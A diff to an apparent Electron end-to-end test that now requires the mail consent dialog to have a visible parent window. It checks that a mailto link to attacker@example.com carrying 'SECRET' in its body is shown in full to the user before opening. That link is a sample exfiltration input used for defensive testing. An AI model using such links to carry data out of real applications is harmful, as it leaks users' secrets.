@@ -8,7 +8,7 @@ let app;
 try{
  app=await electron.launch({args:[resolve('.'),'--user-data-dir='+root],env:{...process.env,ELECTRON_RUN_AS_NODE:'',VSTUDY_FAKE_PROVIDER:'1'}});
  const page=await app.firstWindow();await page.waitForFunction(()=>!!window.desktop);
- await app.evaluate(({dialog})=>{dialog.showMessageBox=async options=>{globalThis.vstudyMailDialog=options;return {response:0,checkboxChecked:false};};});
+ await app.evaluate(({dialog})=>{dialog.showMessageBox=async (parent,options)=>{if(!parent.isVisible())throw new Error('Consent requires a visible parent');globalThis.vstudyMailDialog=options;return {response:0,checkboxChecked:false};};});
  await page.evaluate(()=>window.desktop.invoke('shell:openExternal',{url:'mailto:attacker@example.com?subject=doc&body=SECRET'}));
  const mail=await app.evaluate(()=>globalThis.vstudyMailDialog.detail);
  assert.equal(mail,'Address: attacker@example.com\nSubject: doc\nBody length: 6 characters\n\nmailto:attacker@example.com?subject=doc&body=SECRET');
